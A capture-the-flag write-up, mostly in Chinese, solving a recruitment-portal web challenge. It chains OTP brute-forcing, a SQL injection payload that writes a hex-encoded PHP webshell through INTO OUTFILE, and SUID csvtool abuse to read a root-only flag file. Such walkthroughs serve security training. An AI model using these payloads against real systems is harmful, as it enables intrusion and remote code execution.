# FU Career

## 題目描述

FPTU Career has launched a new recruitment portal where candidates can register accounts, submit CVs, and track their application status online.

The HR department uses an internal dashboard to manage applicants and preview uploaded CVs before scheduling interviews. However, several features were rushed for the new recruitment season and may not have been thoroughly tested.

Goal: Escalate your privileges to admin and achieve Remote Code Execution (RCE).

Note: rockyou.txt will not be useful for this challenge.

## 解題思路

這題看程式碼可以得知他有兩部分的 flag，第一部分是在 `admin.php` 裡面，第二部分是在 `part2.txt` 裡面

因為 admin 的密碼猜不出來，又看 seed.php 得知帳號名稱就是 admin，於是就去 forgot.php 復原 admin 的密碼，結果發現帳號錯誤

接著看到底下有 contact information，用 `hr.fehn` 即可成功，接著因為他可以重試很多次，所以就爆破 OTP 重設密碼就可以進到 `admin.php` 拿到第一部分的 flag 了

第二部分則是可以在 `preview.php` 裡面看到 sql injection 的漏洞

```php
// Allows UNION-based SQL injection including INTO OUTFILE
$query = "SELECT * FROM cv_submissions WHERE id = $cv_id";
```

所以用 `0 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,'','','','','','','','' INTO OUTFILE '/var/www/html/uploads/webshell.php';--` 即可把 webshell 寫在 `/var/www/html/uploads/webshell.php`

最後因為 `Dockerfile` 有設權限需要 root 才能看到第二部分的 flag

```dockerfile
RUN chmod u+s /usr/bin/csvtool     # SUID root
RUN chmod 0400 /part2.txt && chown root:root /part2.txt
```

所以就用 `csvtool cat /part2.txt` 即可看到第二部分的 flag

## Flag

```text
LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}
```
